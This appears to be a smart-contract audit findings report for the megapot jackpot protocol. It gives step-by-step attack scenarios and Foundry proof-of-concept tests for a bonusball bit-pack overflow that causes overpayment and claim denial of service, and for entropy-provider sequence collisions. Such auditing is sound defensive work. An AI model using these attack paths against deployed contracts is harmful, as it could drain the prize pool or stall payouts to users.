# 2025 11 megapot - Findings Report
## Commit hash: f0a7297d59c376e38b287b2c56740617dbbfbdc7

##Findings by Pattern


 **Derived From** : for all drawings d: drawingState[d].ballMax + drawingState[d].bonusballMax <= 255

[M-2]. Bit-pack overflow creates phantom bonusball match: claims underflow/DoS and mis-tier payouts from Jackpot.scaledEntropyCallback
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 7
Privilege: Permissionless



 **Derived From** : Bonusball bit-pack overflow corrupts tiering and can revert/overpay claims

[H-3]. Unbounded bonusballMax in Jackpot._setNewDrawingState breaks bitpacking and tiering when normalMax+bonusball>255
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 7
Privilege: Permissionless




 **Derived From** : Pending keyed only by sequence causes cross‑provider collisions and misdelivery

[M-5]. Cross-provider sequence collisions in ScaledEntropyProvider._storePendingRequest cause misdelivery and permanent loss of entropy requests
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 6
Privilege: RequiresAdminRole



 **Derived From** : Provider change can corrupt pending randomness due to per-provider sequence collisions

[M-11]. Provider switch reuses sequence IDs across providers, overwriting pending[sequence] → wrong callback delivery and DoS (UnknownSequence) in ScaledEntropyProvider.setEntropyProvider
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: RequiresAdminRole



 **Derived From** : Sequence-only pending key + ignored provider lets provider rotation hijack callbacks

[M-12]. Provider rotation overwrites pending[sequence], misroutes randomness and bricks prior request via UnknownSequence
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 7
Privilege: RequiresAdminRole



 **Derived From** : Mid-drawing payout-calculator swap zeroes all tier payouts due to missing snapshot guard

[M-13]. GuaranteedMinimumPayoutCalculator can settle with uninitialized snapshot after mid-drawing swap, zeroing all tier payouts
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: RequiresAdminRole



 **Derived From** : Let a = getTicketInfo(tokenId) and b = getExtendedTicketInfo(tokenId). Then b.ticketId == tokenId AND b.ticket.drawingId == a.drawingId AND b.ticket.packedTicket == a.packedTicket AND b.ticket.referralScheme == a.referralScheme AND b.normals.length == 5 AND b.bonusball >= 1

[M-14]. Bit-packing overflow breaks JackpotTicketNFT.getExtendedTicketInfo: normals length != 5 and bonusball == 0 when normalBallMax + bonusball > 255
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 7
Privilege: Permissionless



 **Derived From** : No-referral winnings credited to current round lpEarnings skews accounting across rounds

[M-15]. claimWinnings time-shifts “no-referral” referrerShare into arbitrary future round lpEarnings, inflating fees and breaking per-round accounting
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 6
Privilege: Permissionless



 **Derived From** : Price desync: BridgeManager charges global ticketPrice, stranding overpayments

[H-16]. BridgeManager.buyTickets over/undercharges due to desynced global vs per‑drawing ticket price, causing stranded USDC or DoS
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: Permissionless



 **Derived From** : Emergency refunds use current referralFee instead of purchase-time value, over/under-refunding

[M-18]. Emergency refunds mis-account referred tickets by using mutable referralFee, enabling refund+referral double-payout
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: Permissionless




 **Derived From** : pending[sequence].callback == msg.sender && pending[sequence].selector == _selector && pending[sequence].setRequests.length == _requests.length

[M-23]. Provider switch lets attacker collide sequence keys and overwrite pending[sequence], hijacking/DoSing entropy callbacks
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: Permissionless


### Number of Findings
- C: 0
- H: 2
- M: 9
- L: 11
- I: 1

##Findings by Pattern


 **Derived From** : Referral rounding dust not allocated causes persistent accounting drift

## [L-1]. Per-split referral flooring strands USDC in Jackpot._validateAndTrackReferrals/_payReferrersWinnings causing cumulative accounting drift

### Finding Severity Justification: Per-referrer flooring in both purchase-time and claim-time referral distributions can leave tiny remainders (dust) unallocated. This does not endanger solvency or enable theft; it results in minor underpayments spread across referrers/winners and the remainder staying in the contract. The project’s rules explicitly accept small dust favoring solvency, so impact is limited to minor accounting drift, fitting QA/Low.
## Derived From Pattern/Invariant
Referral rounding dust not allocated causes persistent accounting drift

## Exploit Type
AccountingInvariantViolation

## Location
Jackpot.Jackpot._validateAndTrackReferrals

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
## Minimim Privilege Required:Permissionless






 **Derived From** : for all drawings d: drawingState[d].ballMax + drawingState[d].bonusballMax <= 255

## [M-2]. Bit-pack overflow creates phantom bonusball match: claims underflow/DoS and mis-tier payouts from Jackpot.scaledEntropyCallback

### Finding Severity Justification: The protocol fails to enforce the bit-packing invariant ballMax + bonusballMax <= 255. When exceeded, the bonusball bit overflows the 256-bit vector and is lost, causing every ticket to appear to match the bonusball. This makes tier computation wrong and reverts for legitimate tier-1 winners (0 normals + bonusball), and misclassifies all other winners (e.g., k normals maps to tier 2k-1). Impact: denial of service for a class of winners and incorrect payouts across tiers, which can deviate from the precomputed tier budgets and threaten solvency. Likelihood depends on parameter growth (bonusballMax > 127 when normalBallMax <= 128), so it is lower, but the impact on settled winnings is material.
## Derived From Pattern/Invariant
for all drawings d: drawingState[d].ballMax + drawingState[d].bonusballMax <= 255

## Exploit Type
IntegerMath

## Location
Jackpot.scaledEntropyCallback

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 7
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
Jackpot._setNewDrawingState computes bonusballMax without capping to (255 - ballMax). When ballMax + bonusballMax > 255, all bit-packs that set the bonusball bit do: 1 << (bonusball + ballMax) which overflows the 256-bit word and yields 0. This corrupts packed tickets and winningTicket, making the bonusball bit effectively absent. Later, _calculateTicketTierId shifts both packed values by (ballMax + 1) and compares equality to detect bonusball matches. With both shifted values equal to 0, every ticket appears to match the bonusball. The formula then subtracts bonusballMatch from the normal match count: return 2 * (matches - bonusballMatch) + bonusballMatch; If matches == 0, this underflows (0 - 1) and reverts, causing a DoS for valid tier-1 winners (0 normals + bonusball match). Even when matches > 0, the tier id is misclassified as 2*k - 1 instead of 2*k (no bonusball) or 2*k + 1 (with bonusball), leading to incorrect payouts. Vulnerable snippet: in Jackpot._setNewDrawingState: uint8 newBonusball = uint8(Math.max(bonusballMin, Math.ceilDiv(minNumberTickets, combosPerBonusball))); newDrawingState.bonusballMax = newBonusball; and in TicketComboTracker.insert: ticketNumbers = set |= 1 << (_bonusball + _tracker.normalMax); and in Jackpot._calculateTicketTierId: uint256 ticketBonusball = _ticketNumbers >> (_normalBallMax + 1); uint256 winningBonusball = _winningNumbers >> (_normalBallMax + 1); uint256 bonusballMatch = (ticketBonusball == winningBonusball) ? 1 : 0; return 2 * (matches - bonusballMatch) + bonusballMatch;

## Impact
If ballMax + bonusballMax exceeds 255, the bonusball bit overflows the 256-bit pack and evaluates to zero. This produces a phantom bonusball match because both ticket and winning "bonusball fields" shift to zero and compare equal. Consequences: (a) tickets with zero normal matches revert on claim due to underflow in tier computation; (b) all other winners are misclassified as if they matched the bonusball, shifting payouts across tiers and deviating from precomputed budgets; (c) unpacking helpers can revert due to malformed packed tickets, degrading UX. This can be triggered if drawing parameters let bonusballMax grow beyond 255 - normalBallMax.

## Command to Run Test


## Proof of Concept
Setup: Any drawing where normalBallMax + bonusballMax > 255 (e.g., normalBallMax=250 and bonusballMax>5). When tickets and the winning number are packed, the bonusball bit is written at position normalMax+bonusball; for values >255 this becomes 1 << >=256 which evaluates to 0 in Solidity, losing the bit.
Exploit A (DoS on Tier-1: 0 normals + bonusball):
- Given a winner with zero normal overlap and a bonusball chosen in the overflow range, both ticket and winning packed values have no bonusball bit set (zero above normalMax).
- In _calculateTicketTierId, ticketBonusball = ticketPacked >> (normalMax+1) and winningBonusball = winningPacked >> (normalMax+1) both equal 0, thus bonusballMatch = 1.
- matches = popCount(ticketPacked & winningPacked) = 0 (since no normals matched and bonusball bit is absent).
- Tier formula 2*(matches - bonusballMatch) + bonusballMatch underflows at (0 - 1) and reverts, DoSing legitimate claims.
Exploit B (Misclassification for k>0 normals):
- With k normal matches and missing bonusball bit, bonusballMatch is still 1 due to 0==0 comparison, but matches was counted without the bonusball.
- Returned tier becomes 2*(k - 1) + 1 = 2k - 1, misclassifying the ticket as if it matched the bonusball, skewing payouts.

## Proof of Code
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {Jackpot} from "contracts/Jackpot.sol";

contract JackpotHarness is Jackpot {
    constructor()
        Jackpot(
            1,          // drawingDurationInSeconds
            1,          // normalBallMax (unused by exposeTier)
            1,          // bonusballMin
            1e16,       // lpEdgeTarget
            0,          // reserveRatio
            0,          // referralFee
            0,          // referralWinShare
            0,          // protocolFee
            1,          // protocolFeeThreshold
            1,          // ticketPrice
            1,          // maxReferrers
            21000       // entropyBaseGasLimit
        )
    {}

    function exposeTier(uint256 ticketPacked, uint256 winningPacked, uint256 normalMax)
        external
        pure
        returns (uint256)
    {
        return _calculateTicketTierId(ticketPacked, winningPacked, normalMax);
    }
}

contract BitPackOverflowTest is Test {
    JackpotHarness harness;

    function setUp() public {
        harness = new JackpotHarness();
    }

    function _packNormals(uint8[] memory nums) internal pure returns (uint256 v) {
        for (uint256 i; i < nums.length; i++) {
            v |= (uint256(1) << nums[i]);
        }
    }

    function _arr(uint8 a,uint8 b,uint8 c,uint8 d,uint8 e) internal pure returns (uint8[] memory r){
        r = new uint8[](5); r[0]=a; r[1]=b; r[2]=c; r[3]=d; r[4]=e;
    }

    // Demonstrates underflow DoS when both bonusball fields overflow and compare equal to zero.
    function test_DoS_Underflow_ZeroNormals_PhantomBonusball() public {
        uint256 normalBallMax = 250; // implies any bonusball > 5 overflows the bit pack
        // No overlapping normals and no bonusball bit set in either packed value (simulate overflowed bonusball)
        uint256 ticketPacked = _packNormals(_arr(1,2,3,4,5));
        uint256 winningPacked = _packNormals(_arr(6,7,8,9,10));
        vm.expectRevert();
        harness.exposeTier(ticketPacked, winningPacked, normalBallMax);
    }

    // Demonstrates misclassification: k normals -> tier 2k-1 due to phantom bonusball match (0==0)
    function test_Misclassification_KNormals_PhantomBonusball() public {
        uint256 normalBallMax = 250; // overflow zone for bonusball
        // 3 normal overlaps (1,2,3). No bonusball bit present in either (simulating overflow).
        uint256 ticketPacked = _packNormals(_arr(1,2,3,4,5));
        uint256 winningPacked = _packNormals(_arr(1,2,3,9,10));
        uint256 tier = harness.exposeTier(ticketPacked, winningPacked, normalBallMax);
        // Expected wrong tier due to bug: 2*(3 - 1) + 1 = 5 (instead of 2*3 = 6 or 7)
        assertEq(tier, 5, "Expected misclassified tier 2k-1 due to phantom bonusball match");
    }
}


## Suggested Mitigation
- Enforce packing bounds at drawing initialization and tracker setup:
  - In Jackpot._setNewDrawingState, cap the computed bonusballMax so that normalBallMax + bonusballMax <= 255:
    - uint8 maxBonus = uint8(MAX_BIT_VECTOR_SIZE - normalBallMax);
    - uint8 raw = uint8(Math.max(bonusballMin, Math.ceilDiv(minNumberTickets, combosPerBonusball)));
    - newDrawingState.bonusballMax = raw > maxBonus ? maxBonus : raw;
  - Add a hard check in TicketComboTracker.init: require(_normalMax + _bonusballMax <= 255, "Bit-pack overflow");
  - Optionally, guard admin setters:
    - setBonusballMin: require(_bonusballMin <= MAX_BIT_VECTOR_SIZE - normalBallMax);
    - setNormalBallMax: require(_normalBallMax <= 128) (aligns with Combinations.choose) and ensure bonusballMin <= 255 - _normalBallMax.
- Make tier computation robust against absent bonusball bits to prevent underflow and phantom matches even if a bound is ever violated:
  - In _calculateTicketTierId, compute normal matches only and treat zero==zero as no bonusball match:
    - normalMatches = popCount((_ticketNumbers & _winningNumbers) & ((uint256(1) << (_normalBallMax + 1)) - 2));
    - ticketBonus = _ticketNumbers >> (_normalBallMax + 1);
    - winningBonus = _winningNumbers >> (_normalBallMax + 1);
    - bonusballMatch = (ticketBonus != 0 && winningBonus != 0 && ticketBonus == winningBonus) ? 1 : 0;
    - return 2 * normalMatches + bonusballMatch;
This combination of proactive caps and defensive computation fully eliminates the overflow condition, prevents claim DoS, and preserves correct tier classification.





 **Derived From** : Bonusball bit-pack overflow corrupts tiering and can revert/overpay claims

## [H-3]. Unbounded bonusballMax in Jackpot._setNewDrawingState breaks bitpacking and tiering when normalMax+bonusball>255

### Finding Severity Justification: bonusballMax is not clamped against the bitpacking limit (255 - normalBallMax). When normalBallMax + bonusballMax > 255, the bonusball bit is silently dropped during packing, causing all tickets to appear as if their bonusball matched. This misclassifies tiers at claim time, enabling overpayment beyond the prize pool (assets loss) and causing underflow reverts for 0-normal-match tickets. The path is permissionless and does not rely on trusted roles; it can be triggered by buying enough tickets in the prior round to inflate the next round’s prize pool so that ceilDiv(minTickets, C(normalMax,5)) exceeds 255 - normalMax. With smaller normalBallMax values (e.g., 20–35), the required ticket volume is realistically reachable.
## Derived From Pattern/Invariant
Bonusball bit-pack overflow corrupts tiering and can revert/overpay claims

## Exploit Type
AccountingInvariantViolation

## Location
Jackpot._setNewDrawingState

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 7
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
Jackpot packs tickets as a uint256 bitset: normals occupy bits [1..ballMax], and the bonusball is stored at bit (ballMax + bonusball). In _setNewDrawingState(), bonusballMax is computed without an upper bound:

- _setNewDrawingState:
  combosPerBonusball = Combinations.choose(normalBallMax, 5)
  minNumberTickets = newPrizePool * 1e18 / ((1e18 - lpEdgeTarget) * ticketPrice)
  newBonusball = uint8(Math.max(bonusballMin, Math.ceilDiv(minNumberTickets, combosPerBonusball)))
  newDrawingState.bonusballMax = newBonusball
  TicketComboTracker.init(..., normalBallMax, newBonusball, ...)

- TicketComboTracker.insert:
  ticketNumbers = set |= 1 << (_bonusball + _tracker.normalMax)

- Jackpot._calculateTicketTierId:
  ticketBonusball = _ticketNumbers >> (_normalBallMax + 1)
  winningBonusball = _winningNumbers >> (_normalBallMax + 1)
  bonusballMatch = (ticketBonusball == winningBonusball) ? 1 : 0

If normalBallMax + bonusball (or bonusballMax) exceeds 255, the left shift 1 << (bonusball + normalMax) overflows the uint256 width and evaluates to 0, silently dropping the bonusball bit in both tickets and the winning combination. Later, right-shifting by (normalMax + 1) yields 0 for both, making bonusballMatch spuriously true. This breaks accounting invariants: (a) claims with 0 normal matches underflow and revert in tier computation (2*(matches - 1) + 1), creating DoS for valid winners, and (b) non-zero matches are over-tiered (treated as if bonusball matched), overpaying users and misallocating the prize pool. The protocol never enforces ballMax + bonusballMax ≤ 255 at drawing transitions or admin setters (bonusballMin can be set arbitrarily high), so a large next-round prize pool or misconfigured bonusballMin can produce an unrepresentable bonusball, corrupting settlement/tiering for the entire round.

## Impact
If normalBallMax + bonusballMax exceeds 255, the packed bonusball bit silently drops to 0. As a result, during claims every ticket appears to have a bonusball match, and tickets with 0 normal matches revert due to underflow in tier computation. More critically, payoutCalculator tier amounts are computed from correct per-tier counts (based on the integer bonusball value), while claim classification is corrupted (based on the packed bit), so users can claim higher tiers than budgeted. This misalignment enables overpayment beyond the prize pool and can render the LP pool insolvent. The condition can be reached either by: (a) misconfiguration (owner sets bonusballMin too high or normalBallMax too high), or (b) permissionlessly inflating next round’s prize pool via massive ticket purchases so that ceilDiv(minTickets, C(normalMax,5)) > 255 - normalBallMax. Even if (b) is operationally heavy for some parameterizations, (a) is an immediate and realistic risk unless invariants are enforced.

## Command to Run Test


## Proof of Concept
- Pre-condition: normalBallMax is small (e.g., 10 or 20) and bonusballMin is not capped versus 255 - normalBallMax.
- Step 1: In drawing N, a user (permissionless) buys a very large number of tickets, making currentDrawingState.lpEarnings huge. No cap exists on number of tickets sold.
- Step 2: On settlement, newLPValue = lpPoolTotal + lpEarnings − userWinnings − protocolFee. With enormous lpEarnings and bounded userWinnings (limited by drawing N prize pool), newLPValue grows very large.
- Step 3: _setNewDrawingState computes newPrizePool = newLPValue*(1 - reserveRatio) and then newBonusball = ceil(minTickets/combosPerBonusball). Since minTickets scales with newPrizePool, newBonusball can exceed (255 - normalBallMax).
- Step 4: TicketComboTracker.init for drawing N+1 uses this oversized bonusballMax. When tickets are inserted, left shift 1 << (bonusball + normalMax) overflows to 0, dropping bonusball bits.
- Step 5: During claims for drawing N+1, _calculateTicketTierId sees ticketBonusball == winningBonusball == 0, setting bonusballMatch=1 for all tickets. If matched normals=0, tier math underflows and reverts; if >0, tickets are over-tiered and overpaid, misallocating funds.

## Proof of Code
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {TicketComboTracker} from "contracts/lib/TicketComboTracker.sol";
import {LibBit} from "solady/src/utils/LibBit.sol";

// Harness that reproduces Jackpot._calculateTicketTierId logic
contract TierHarness {
    function pack(uint8[] memory normals, uint8 normalMax, uint8 bb) public pure returns (uint256) {
        uint256 set = TicketComboTracker.toNormalsBitVector(normals, normalMax);
        return set | (uint256(1) << (uint256(bb) + normalMax));
    }

    function calc(uint256 t, uint256 w, uint256 normalMax) public pure returns (uint256) {
        uint256 matches = LibBit.popCount(t & w);
        uint256 ticketBB = t >> (normalMax + 1);
        uint256 winningBB = w >> (normalMax + 1);
        uint256 bbMatch = (ticketBB == winningBB) ? 1 : 0;
        return 2 * (matches - bbMatch) + bbMatch; // underflows if matches==0 and bbMatch==1
    }
}

contract BitpackOverflowTest is Test {
    TierHarness h;

    function setUp() public { h = new TierHarness(); }

    // Demonstrates DoS: with 0 normal matches, spurious bonusballMatch causes underflow revert
    function test_BonusballOverflowBreaksTiering_and_CausesUnderflow() public {
        uint8 normalMax = 250;        // leaves only 5 usable bits up to 255
        uint8 ticketBB = 10;          // 250 + 10 = 260 -> left shift overflows to 0
        uint8 winningBB = 7;          // 250 + 7 = 257 -> left shift overflows to 0

        // Ticket normals and winning normals do not overlap (0 matches)
        uint8[] memory normalsTicket = new uint8[](5);
        normalsTicket[0]=1; normalsTicket[1]=2; normalsTicket[2]=3; normalsTicket[3]=4; normalsTicket[4]=5;
        uint8[] memory normalsWin = new uint8[](5);
        normalsWin[0]=6; normalsWin[1]=7; normalsWin[2]=8; normalsWin[3]=9; normalsWin[4]=10;

        uint256 t = h.pack(normalsTicket, normalMax, ticketBB); // bonusball bit dropped
        uint256 w = h.pack(normalsWin,   normalMax, winningBB); // bonusball bit dropped

        // Both appear to have bonusball == 0 after shifting
        assertEq(t >> (normalMax + 1), 0);
        assertEq(w >> (normalMax + 1), 0);

        // Now tier calc thinks bonusball matched (spurious 1), causing matches-bbMatch underflow
        vm.expectRevert();
        h.calc(t, w, normalMax);
    }

    // Demonstrates overpayment: ticket with 1 normal match is misclassified as having bonusball match
    function test_BonusballOverflow_OverpaysHigherTier() public {
        uint8 normalMax = 250;
        uint8 ticketBB = 10;
        uint8 winningBB = 7;

        // 1 normal match: both include '10'
        uint8[] memory normalsTicket = new uint8[](5);
        normalsTicket[0]=1; normalsTicket[1]=2; normalsTicket[2]=3; normalsTicket[3]=4; normalsTicket[4]=10;
        uint8[] memory normalsWin = new uint8[](5);
        normalsWin[0]=6; normalsWin[1]=7; normalsWin[2]=8; normalsWin[3]=9; normalsWin[4]=10;

        uint256 t = h.pack(normalsTicket, normalMax, ticketBB); // bonusball bit dropped
        uint256 w = h.pack(normalsWin,   normalMax, winningBB); // bonusball bit dropped

        // Due to overflow, bonusball appears equal and tier = 2*(1-1)+1 = 1 (0 normals + bonusball)
        uint256 tier = h.calc(t, w, normalMax);
        assertEq(tier, 1);
        // Correct classification (without overflow) should be tier 2 (1 normal, no bonusball)
    }
}

## Suggested Mitigation
Fully enforce the bit-packing invariant everywhere: (1) In _setNewDrawingState, clamp the computed value: uint8 cap = MAX_BIT_VECTOR_SIZE - normalBallMax; uint8 computed = uint8(Math.max(bonusballMin, Math.ceilDiv(minNumberTickets, combosPerBonusball))); newBonusball = computed > cap ? cap : computed; require(newBonusball > 0, "Invalid bonusballMax"); (2) In setBonusballMin(uint8 _bonusballMin), add require(_bonusballMin <= MAX_BIT_VECTOR_SIZE - normalBallMax, "bonusballMin too large"); (3) In setNormalBallMax(uint8 _normalBallMax), add require(_normalBallMax <= MAX_BIT_VECTOR_SIZE - 1, "normalBallMax too large"); and require(bonusballMin <= MAX_BIT_VECTOR_SIZE - _normalBallMax, "normal+bonus overflow"); (4) Defense-in-depth: in TicketComboTracker.init, if feasible, validate _bonusballMax <= 255 - _normalMax and revert otherwise (and/or add a runtime assert in buyTickets before insert). These guards prevent overflow of the packed bonusball bit and keep tier accounting aligned with claim classification.





 **Derived From** : (_maxRange - _minRange + 1) does not overflow

## [L-4]. Entropy callback DoS via range overflow in ScaledEntropyProvider._drawWithReplacement bricks randomness delivery

### Finding Severity Justification: The overflow in range computation (max - min + 1) inside _drawWithReplacement is real and will revert for the extreme input (min=0, max=type(uint256).max). However, this only causes the attacker’s own request to fail during the entropy callback and leaves a pending entry, without impacting MegaPot’s core flow. Jackpot’s own requests use safe ranges (min=1, bounded max) and withReplacement=false; thus, there is no realistic path to block or stall the jackpot drawings. The worst systemic effect is storage bloat from paid, failing requests, but there is no direct asset risk or functional DoS to the protocol.
## Derived From Pattern/Invariant
(_maxRange - _minRange + 1) does not overflow

## Exploit Type
IntegerOverflow

## Location
ScaledEntropyProvider._drawWithReplacement

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless




 **Derived From** : Pending keyed only by sequence causes cross‑provider collisions and misdelivery

## [M-5]. Cross-provider sequence collisions in ScaledEntropyProvider._storePendingRequest cause misdelivery and permanent loss of entropy requests

### Finding Severity Justification: Pending entropy requests are keyed only by sequence while Pyth Entropy sequences are per-provider. The callback ignores the provider parameter. If the owner rotates providers while a request is pending, a new request made under the new provider can reuse the same sequence and overwrite the mapping entry. Because requestAndCallbackScaledRandomness is publicly callable, a third-party can force this overwrite and cause the old provider’s fulfillment to be delivered to the wrong callback, leaving the jackpot drawing stuck (liveness failure) and requiring emergency procedures. This does not directly steal assets but can halt core protocol functionality.
## Derived From Pattern/Invariant
Pending keyed only by sequence causes cross‑provider collisions and misdelivery

## Exploit Type
AccountingInvariantViolation

## Location
ScaledEntropyProvider._storePendingRequest

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresAdminRole


## Description
ScaledEntropyProvider keys pending requests only by sequence (mapping(uint64 => PendingRequest) pending) while Pyth Entropy V2 sequences are per-provider. The callback ignores the provider parameter. If owner rotates providers via setEntropyProvider() while old-provider requests are pending, the next request under the new provider can reuse the same sequence and overwrite pending[sequence]. This replaces callback/selector/context and appends setRequests without clearing. When the first provider fulfills, randomness is delivered to the wrong callback (or reverts due to unexpected output shape). The second provider’s later fulfillment then hits an already-deleted pending entry and reverts UnknownSequence(), permanently losing that request and its fee. Vulnerable snippets: mapping(uint64 => PendingRequest) private pending; function entropyCallback(uint64 sequence, address /*provider*/, bytes32 randomNumber) internal override { ... } and in _storePendingRequest: pending[sequence].callback = msg.sender; pending[sequence].selector = _selector; ... pending[sequence].setRequests.push(_setRequests[i]);

## Impact
Pending entropy requests are keyed only by sequence while Pyth Entropy V2 sequences are per-provider. If the owner rotates the provider while a request from the old provider is pending, a new request under the new provider can be assigned the same sequence and overwrite the mapping entry. Because the callback ignores the provider parameter, the next fulfillment from the old provider will be routed using the overwritten entry. Two outcomes follow: (a) if the new callback tolerates the unexpected request shape, the old provider’s fulfillment is misdelivered to the new request’s callback, the pending entry is deleted, and the new provider’s later fulfillment reverts with UnknownSequence() — fee lost and request orphaned; (b) if the new callback reverts (due to unexpected output shape), both providers’ reveals will keep reverting and the drawing becomes stuck until emergency procedures. This does not directly steal funds but burns entropy fees and threatens protocol liveness.

## Command to Run Test


## Proof of Concept
Scenario showing misdelivery and subsequent loss of the new-provider request:
1) User A requests via provider P0; Pyth assigns sequence=1; pending[1] stores A’s callback and requests.
2) Owner rotates to provider P1 while A’s request is still pending.
3) User B requests via P1; Pyth assigns sequence=1 again (sequences are per-provider). _storePendingRequest overwrites pending[1].callback/selector/context and APPENDS B’s setRequests onto the preexisting setRequests.
4) P0 fulfills first: entropyCallback looks up pending[1] (now pointing to B), deletes it, builds scaled outputs for the mixed request shape (A+B), and calls B’s callback. If B’s callback accepts arbitrary lengths, the call succeeds – the randomness is misdelivered to B instead of A.
5) P1 fulfills later: since pending[1] was deleted on step 4, entropyCallback reverts UnknownSequence(). Thus, B’s request/fee is lost and A never received the intended callback.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {ScaledEntropyProvider} from "contracts/ScaledEntropyProvider.sol";
import {IScaledEntropyProvider} from "contracts/interfaces/IScaledEntropyProvider.sol";
import {IEntropyV2} from "@pythnetwork/entropy-sdk-solidity/IEntropyV2.sol";
import {IEntropyConsumer} from "@pythnetwork/entropy-sdk-solidity/IEntropyConsumer.sol";

contract MockEntropy is IEntropyV2 {
    mapping(address => uint64) public nextSeq;

    function requestV2(address provider, uint32) external payable returns (uint64 assignedSequenceNumber) {
        require(msg.value >= 1, "fee");
        assignedSequenceNumber = ++nextSeq[provider];
    }

    // Unused overloads in this PoC
    function requestV2() external payable returns (uint64) { revert(); }
    function requestV2(uint32) external payable returns (uint64) { revert(); }
    function requestV2(address, bytes32, uint32) external payable returns (uint64) { revert(); }

    function getProviderInfoV2(address) external view returns (EntropyStructsV2.ProviderInfo memory) { revert(); }
    function getDefaultProvider() external view returns (address) { return address(0); }
    function getRequestV2(address, uint64) external view returns (EntropyStructsV2.Request memory) { revert(); }
    function getFeeV2() external view returns (uint128) { return 1; }
    function getFeeV2(uint32) external view returns (uint128) { return 1; }
    function getFeeV2(address, uint32) external view returns (uint128) { return 1; }

    // Simulate provider reveal -> consumer callback
    function reveal(address consumer, address provider, uint64 sequence, bytes32 rnd) external {
        IEntropyConsumer(consumer)._entropyCallback(sequence, provider, rnd);
    }
}

contract Receiver {
    bool public called;
    uint256 public lastLen;

    // Accept any shape to let misdelivery succeed
    function onEntropy(uint64, uint256[][] calldata numbers, bytes calldata) external {
        called = true;
        lastLen = numbers.length;
    }

    function doRequest(
        ScaledEntropyProvider provider,
        uint32 gasLimit,
        IScaledEntropyProvider.SetRequest[] memory reqs,
        bytes4 selector,
        bytes memory ctx
    ) external payable returns (uint64) {
        return provider.requestAndCallbackScaledRandomness{value: msg.value}(gasLimit, reqs, selector, ctx);
    }
}

contract ScaledEntropy_SequenceCollision_PoC is Test {
    MockEntropy entropy;
    ScaledEntropyProvider provider;
    address P0 = address(0xAAA0);
    address P1 = address(0xBBB1);

    function setUp() public {
        entropy = new MockEntropy();
        provider = new ScaledEntropyProvider(address(entropy), P0);
    }

    function _req(uint8 samples, uint256 minR, uint256 maxR, bool withRep) internal pure returns (IScaledEntropyProvider.SetRequest memory r) {
        r.samples = samples; r.minRange = minR; r.maxRange = maxR; r.withReplacement = withRep;
    }

    function test_CrossProviderSequenceCollision_misdelivery_then_loss() public {
        Receiver A = new Receiver();
        Receiver B = new Receiver();

        // A requests on P0 => sequence 1
        IScaledEntropyProvider.SetRequest[] memory aReq = new IScaledEntropyProvider.SetRequest[](2);
        aReq[0] = _req(1, 1, 2, false);
        aReq[1] = _req(1, 1, 2, true);
        vm.deal(address(A), 10 ether);
        vm.prank(address(A));
        uint64 seqA = A.doRequest{value: 1}(provider, 200000, aReq, Receiver.onEntropy.selector, "A");
        assertEq(seqA, 1, "seqA should be 1 on P0");

        // Rotate to P1 while seqA is pending
        provider.setEntropyProvider(P1);

        // B requests on P1 => sequence 1 (per-provider sequencing)
        IScaledEntropyProvider.SetRequest[] memory bReq = new IScaledEntropyProvider.SetRequest[](2);
        bReq[0] = _req(1, 1, 2, false);
        bReq[1] = _req(1, 1, 2, true);
        vm.deal(address(B), 10 ether);
        vm.prank(address(B));
        uint64 seqB = B.doRequest{value: 1}(provider, 200000, bReq, Receiver.onEntropy.selector, "B");
        assertEq(seqB, 1, "seqB should be 1 on P1");

        // Old provider fulfills first: misdelivered to B (overwritten mapping; mixed shape of length 4)
        entropy.reveal(address(provider), P0, 1, bytes32(uint256(123)));
        assertTrue(B.called(), "B should have been called (misdelivery)");
        assertEq(B.lastLen(), 4, "mixed setRequests length should be 4");
        assertFalse(A.called(), "A should NOT be called");

        // New provider fulfills later: entry was deleted -> UnknownSequence
        vm.expectRevert(ScaledEntropyProvider.UnknownSequence.selector);
        entropy.reveal(address(provider), P1, 1, bytes32(uint256(456)));

        // No pending remains for sequence 1
        ScaledEntropyProvider.PendingRequest memory pr = provider.getPendingRequest(1);
        assertEq(pr.callback, address(0), "pending cleared");
    }
}


## Suggested Mitigation
Key pending requests by both provider and sequence, and validate the provider in the callback:
- Replace mapping(uint64 => PendingRequest) with mapping(bytes32 => PendingRequest) or mapping(address => mapping(uint64 => PendingRequest)). For example: bytes32 key = keccak256(abi.encodePacked(_providerUsedAtRequestTime, sequence));
- In request path, compute key using the exact provider address supplied to entropy.requestV2 and store it alongside (also record the provider in PendingRequest for sanity checks).
- In entropyCallback, use the provider parameter to derive the same key and check it matches the stored provider; revert if mismatched.
- Reinitialize the storage struct before writing to avoid appending to an existing setRequests array (e.g., delete pending[key]; then assign each field; or create a fresh struct and store it once). This prevents mixed shapes even if keys are accidentally reused.
- Operational hardening: optionally disallow provider rotation while any pending requests exist (or enforce zero pending across all provider namespaces) to avoid surprises during rotations.





 **Derived From** : Unbounded iteration in getUserTickets can gas-DoS on-chain callers

## [L-6]. Unbounded loop and array allocation in JackpotBridgeManager.getUserTickets enable gas-based DoS against on-chain integrations

